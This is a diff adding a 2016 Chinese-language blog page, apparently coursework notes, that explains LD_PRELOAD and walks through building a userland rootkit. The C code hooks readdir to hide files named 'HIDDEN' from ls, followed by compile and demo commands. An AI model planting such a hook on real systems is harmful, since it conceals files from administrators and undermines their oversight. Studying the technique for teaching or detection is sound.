@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
+  <title>攻防Project2 - LD_PRELOAD實作library rootkit | Kaibro&#39;s blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="LD_PRELOADLD_PRELOAD是Linux/Unix下的環境變數，他可以決定預先要載入的共享函式庫它比LD_LIBRARY_PATH指定的共用函式庫還要優先，因此LD_PRELOAD裡的全域符號會蓋掉後面載入的同名全域符號所以我們可以利用LD_PRELOAD來達成Linux/Unix下的hook，要達到rootkit的效果也就輕而易舉但這只對動態連結的程式有效，因為靜態連結函式庫的代碼都">
+<meta property="og:type" content="article">
+<meta property="og:title" content="攻防Project2 - LD_PRELOAD實作library rootkit">
+<meta property="og:url" content="http://yoursite.com/2016/01/18/project2/index.html">
+<meta property="og:site_name" content="Kaibro's blog">
+<meta property="og:description" content="LD_PRELOADLD_PRELOAD是Linux/Unix下的環境變數，他可以決定預先要載入的共享函式庫它比LD_LIBRARY_PATH指定的共用函式庫還要優先，因此LD_PRELOAD裡的全域符號會蓋掉後面載入的同名全域符號所以我們可以利用LD_PRELOAD來達成Linux/Unix下的hook，要達到rootkit的效果也就輕而易舉但這只對動態連結的程式有效，因為靜態連結函式庫的代碼都">
+<meta property="og:updated_time" content="2016-01-19T14:41:46.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="攻防Project2 - LD_PRELOAD實作library rootkit">
+<meta name="twitter:description" content="LD_PRELOADLD_PRELOAD是Linux/Unix下的環境變數，他可以決定預先要載入的共享函式庫它比LD_LIBRARY_PATH指定的共用函式庫還要優先，因此LD_PRELOAD裡的全域符號會蓋掉後面載入的同名全域符號所以我們可以利用LD_PRELOAD來達成Linux/Unix下的hook，要達到rootkit的效果也就輕而易舉但這只對動態連結的程式有效，因為靜態連結函式庫的代碼都">
+  
+    <link rel="alternative" href="/atom.xml" title="Kaibro&#39;s blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link rel="stylesheet" href="/css/style.css" type="text/css">
+</head>
+
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img lazy-src="https://avatars.plurk.com/10562062-big32.jpg" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/">KaiBro</a></h1>
+		</hgroup>
+
+		
+
+		
+			<div class="switch-btn">
+				<div class="icon">
+					<div class="icon-ctn">
+						<div class="icon-wrap icon-house" data-idx="0">
+							<div class="birdhouse"></div>
+							<div class="birdhouse_holes"></div>
+						</div>
+						<div class="icon-wrap icon-ribbon hide" data-idx="1">
+							<div class="ribbon"></div>
+						</div>
+						
+						
+						<div class="icon-wrap icon-me hide" data-idx="3">
+							<div class="user"></div>
+							<div class="shoulder"></div>
+						</div>
+						
+					</div>
+					
+				</div>
+				<div class="tips-box hide">
+					<div class="tips-arrow"></div>
+					<ul class="tips-inner">
+						<li>菜单</li>
+						<li>標籤</li>
+						
+						
+						<li>關於</li>
+						
+					</ul>
+				</div>
+			</div>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">主頁</a></li>
+				        
+							<li><a href="/archives">所有文章</a></li>
+				        
+							<li><a href="/tags/食記">吃吃喝喝</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+								<a class="github" target="_blank" href="https://github.com/w181496" title="github">github</a>
+					        
+								<a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+					        
+								<a class="facebook" target="_blank" href="https://www.facebook.com/w181496" title="facebook">facebook</a>
+					        
+						</div>
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/NCU/" style="font-size: 15px;">NCU</a> <a href="/tags/筆記/" style="font-size: 20px;">筆記</a> <a href="/tags/食記/" style="font-size: 10px;">食記</a>
+					</div>
+				</section>
+				
+				
+				
+
+				
+				
+				<section class="switch-part switch-part3">
+				
+					<div id="js-aboutme">我是Kaibro</div>
+				</section>
+				
+			</div>
+		</div>
+	</header>				
+</div>
+
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide">KaiBro</h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+			
+				<img lazy-src="https://avatars.plurk.com/10562062-big32.jpg" class="js-avatar">
+			
+			</div>
+			<hgroup>
+			  <h1 class="header-author">KaiBro</h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主頁</a></li>
+		        
+					<li><a href="/archives">所有文章</a></li>
+		        
+					<li><a href="/tags/食記">吃吃喝喝</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+						<a class="github" target="_blank" href="https://github.com/w181496" title="github">github</a>
+			        
+						<a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+			        
+						<a class="facebook" target="_blank" href="https://www.facebook.com/w181496" title="facebook">facebook</a>
+			        
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+
+      <div class="body-wrap"><article id="post-project2" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/01/18/project2/" class="article-date">
+  	<time datetime="2016-01-18T07:36:24.000Z" itemprop="datePublished">2016-01-18</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      攻防Project2 - LD_PRELOAD實作library rootkit
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/NCU/">NCU</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/筆記/">筆記</a></li></ul>
+	</div>
+
+        
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="LD_PRELOAD"><a href="#LD_PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h2><p>LD_PRELOAD是Linux/Unix下的環境變數，他可以決定預先要載入的共享函式庫<br>它比LD_LIBRARY_PATH指定的共用函式庫還要優先，因此LD_PRELOAD裡的全域符號會蓋掉後面載入的同名全域符號<br>所以我們可以利用LD_PRELOAD來達成Linux/Unix下的hook，要達到rootkit的效果也就輕而易舉<br>但這只對動態連結的程式有效，因為靜態連結函式庫的代碼都已經包進程式中</p>
+<h2 id="u5BE6_u4F5C"><a href="#u5BE6_u4F5C" class="headerlink" title="實作"></a>實作</h2><p>因為ls用到readdir這個函數來實作<br>所以我們覆蓋掉libc裡面的readdir來實作rootkit<br>做法很簡單，載入libc中原本的readdir(我們叫它old_readdir)<br>然後把結果中有”HIDDEN”的都濾掉</p>
+<p>code如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *libc = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> dirent *(*old_readdir)(DIR *dirp);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">struct</span> dirent *<span class="title">readdir</span><span class="params">(DIR *dirp)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">struct</span> dirent *ret = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == libc) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="literal">NULL</span> == (libc = dlopen(<span class="string">"/lib/libc.so.6"</span>, RTLD_LAZY))) &#123;</span><br><span class="line">			<span class="keyword">goto</span> END;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == old_readdir) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="literal">NULL</span> == (old_readdir = dlsym(libc, <span class="string">"readdir"</span>))) &#123;</span><br><span class="line">			<span class="keyword">goto</span> END;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">		ret = old_readdir(dirp);</span><br><span class="line">		<span class="keyword">if</span> (ret &amp;&amp; <span class="number">0</span> == <span class="built_in">strcmp</span>(ret-&gt;d_name, <span class="string">"HIDDEN"</span>)) &#123;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">END:</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>編譯一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -fPIC -shared -o rootkit.so rootkit.c</span><br></pre></td></tr></table></figure></p>
+<p>設置LD_PRELOAD並執行ls<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ /bin/ls&#10;rootkit.c rootkit.so HIDDEN&#10;$ env LD_PRELOAD=./rootkit.so /bin/ls&#10;rootkit.c rootkit.so</span><br></pre></td></tr></table></figure></p>
+<p>即可發現當前目錄下名字為HIDDEN的都消失了，就算下參數-al也一樣</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2016/01/17/中壢-藏壽司-くら寿司-JC-Park中壢店/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">中壢-藏壽司 くら寿司(JC Park中壢店)</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<div class="share_jia">
+	<!-- JiaThis Button BEGIN -->
+	<div class="jiathis_style">
+		<span class="jiathis_txt">分享到: &nbsp; </span>
+		<a class="jiathis_button_facebook"></a> 
+    <a class="jiathis_button_twitter"></a>
+    <a class="jiathis_button_plus"></a> 
+    <a class="jiathis_button_tsina"></a>
+		<a class="jiathis_button_cqq"></a>
+		<a class="jiathis_button_douban"></a>
+		<a class="jiathis_button_weixin"></a>
+		<a class="jiathis_button_tumblr"></a>
+    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jtico jtico_jiathis" target="_blank"></a>
+	</div>
+	<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js?uid=1405949716054953" charset="utf-8"></script>
+	<!-- JiaThis Button END -->
+</div>
+
+
+
+
+
+
+
+
+<section id="comments">
+  <div id="disqus_thread"></div>
+    <script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+    var disqus_shortname = 'kaibrosblog'; // required: replace example with your forum shortname
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+  <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</section>
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+    	<div class="footer-left">
+    		&copy; 2016 KaiBro
+    	</div>
+      	<div class="footer-right">
+      		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
+      	</div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css" type="text/css">
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+<script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js" type="text/javascript"></script>
+<script src="/js/main.js" type="text/javascript"></script>
+
+
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+  </div>
+</body>
+</html>
